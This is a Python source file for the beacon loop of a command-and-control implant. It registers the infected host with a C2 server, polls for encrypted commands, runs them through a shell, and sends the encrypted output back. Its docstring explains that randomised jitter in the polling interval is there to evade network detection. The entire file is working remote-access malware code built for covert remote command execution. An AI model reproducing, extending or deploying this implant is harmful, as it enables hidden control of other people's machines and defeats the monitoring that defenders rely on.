"""
Implant beacon loop.
Registers once on startup, then loops: poll for a task, execute it if one's
pending, post the result back, sleep with jitter, repeat.

Jitter breaks the perfectly regular inter-arrival pattern that network
detection tooling keys off. With JITTER=0.4 (±40 %) a 10-second base
interval becomes anywhere from 6–14 seconds, removing the statistical
regularity without materially affecting responsiveness.
"""
import os
import random
import subprocess
import time

import requests

from crypto import decrypt, encrypt

SERVER = os.environ.get("C2_SERVER", "http://localhost:8000")
POLL_INTERVAL = int(os.environ.get("POLL_INTERVAL", "10"))
# ±JITTER fraction of POLL_INTERVAL — 0.4 = ±40 %
JITTER = float(os.environ.get("JITTER", "0.4"))


def register() -> str:
    while True:
        try:
            resp = requests.post(
                f"{SERVER}/register",
                params={"hostname": os.uname().nodename},
                timeout=5,
            )
            resp.raise_for_status()
            return resp.json()["agent_id"]
        except requests.exceptions.RequestException:
            print("server not reachable yet, retrying in 3s...")
            time.sleep(3)


def poll(agent_id: str) -> dict:
    resp = requests.get(
        f"{SERVER}/tasks/poll", params={"agent_id": agent_id}, timeout=5
    )
    resp.raise_for_status()
    return resp.json()  # {} or {"task_id": ..., "cmd": ...}


def execute(cmd: str) -> tuple[str, str, int]:
    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
    return proc.stdout, proc.stderr, proc.returncode


def post_result(task_id: str, stdout: str, stderr: str, exit_code: int) -> None:
    requests.post(
        f"{SERVER}/tasks/result",
        params={
            "task_id": task_id,
            "stdout": encrypt(stdout),
            "stderr": encrypt(stderr),
            "exit_code": exit_code,
        },
        timeout=5,
    )


def main():
    agent_id = register()
    print(f"registered as {agent_id}")
    while True:
        try:
            task = poll(agent_id)
            if task:
                cmd = decrypt(task["cmd"])
                stdout, stderr, exit_code = execute(cmd)
                post_result(task["task_id"], stdout, stderr, exit_code)
                print(f"ran {task['task_id']}: {cmd!r} -> exit {exit_code}")
        except requests.exceptions.RequestException as e:
            print(f"check-in failed: {e}")
        sleep_for = random.uniform(
            POLL_INTERVAL * (1 - JITTER), POLL_INTERVAL * (1 + JITTER)
        )
        time.sleep(sleep_for)


if __name__ == "__main__":
    main()